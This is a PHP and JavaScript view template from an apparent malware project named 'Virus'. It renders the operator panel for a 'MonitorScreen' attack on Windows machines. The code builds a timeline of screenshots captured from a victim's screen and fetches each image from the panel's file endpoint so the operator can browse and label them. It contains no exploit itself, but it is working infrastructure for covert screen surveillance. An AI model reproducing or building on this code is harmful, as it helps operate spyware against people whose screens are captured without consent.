<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot\Screenshot;
use Kelvinho\Virus\User\User;
use function Kelvinho\Virus\map;

global $timezone;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen\MonitorScreen $attack */
/** @var User $user */

\Kelvinho\Virus\Singleton\BackgroundAttacks::js($attack); ?>
<script>
    class Event extends BaseEvent {
        constructor(unixTime, name, displayTime) {
            super();
            this.unixTime = unixTime;
            this.url = "<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/getFile?file=screen-"; ?>" + unixTime + ".";
            this.name = name ?? "";
            this.displayTime = displayTime;
        }

        renderContent(forStream) {
            const mainSrc = this.url + "<?php echo Screenshot::$IMG_EXTENSION ?>";
            const backupSrc = this.url + "png";
            return `<img width="100%" src="${mainSrc}" alt="screenshot" onerror="this.onerror=null;this.src = '${backupSrc}';">`;
        }

        export() {
            return JSON.stringify({"name": this.name});
        }

        getName() {
            return this.name;
        }

        setName(name) {
            this.name = name;
        }

        getDisplayTime() {
            return this.displayTime;
        }
    }

    /** @type {Object.<number, BaseEvent>} */
    const events = {<?php echo implode(", ", map($attack->getEvents(), fn($name, int $unixTime) => "$unixTime: new Event($unixTime, \"$name\", \"" . $timezone->display($user->getTimezone(), $unixTime) . "\")")); ?>};
    const context = setupBackgroundAttacksJs(events, [<?php echo implode(", ", $attack->getSavedEvents()); ?>].reverse())
</script>
